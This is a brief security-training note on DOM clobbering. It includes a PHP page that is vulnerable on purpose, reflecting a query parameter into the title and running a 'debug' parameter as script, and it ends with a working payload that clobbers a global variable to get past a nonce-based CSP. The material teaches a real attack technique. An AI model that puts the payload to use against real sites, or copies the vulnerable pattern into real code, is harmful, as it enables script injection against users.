# Bypass Techniques

## Dom clobbering

DOM Clobbering is a technique where an attacker manipulates the DOM (Document Object Model) to overwrite **global JavaScript variables** or functions by injecting HTML elements with specific id or name attributes. This can lead to security issues, including XSS, bypassing security checks, and unintended script execution.\
\
Ref:\
[https://medium.com/@ibm\_ptc\_security/dom-clobbering-baa55c208bce](https://medium.com/@ibm_ptc_security/dom-clobbering-baa55c208bce)\
[https://cheatsheetseries.owasp.org/cheatsheets/DOM\_Clobbering\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html)

```php
<?php
$nonce = md5(random_bytes(32));
header("Content-Security-Policy: script-src 'nonce-$nonce'");
?>
<head>
    <meta charset="UTF-8">
    <title>
        <?php echo 'Welcome ' . ($_GET['name'] ?? "") ?>
    </title>
    <script nonce="<?php echo $nonce ?>">
        window.environment = 'production';
    </script>
</head>
<body>
<script nonce="<?php echo $nonce ?>">
    if (window.environment && window.environment !== 'production') {
        let debug = new URL(location).searchParams.get('debug') || '';
        const script = document.createElement('script');
        script.nonce = "<?php echo $nonce ?>";
        script.innerText = debug;
        document.body.appendChild(script);
    }
</script>
</body>

# Payload: 
# ?name=</title><div id=environment ><script>&debug=alert("Wizer")
```
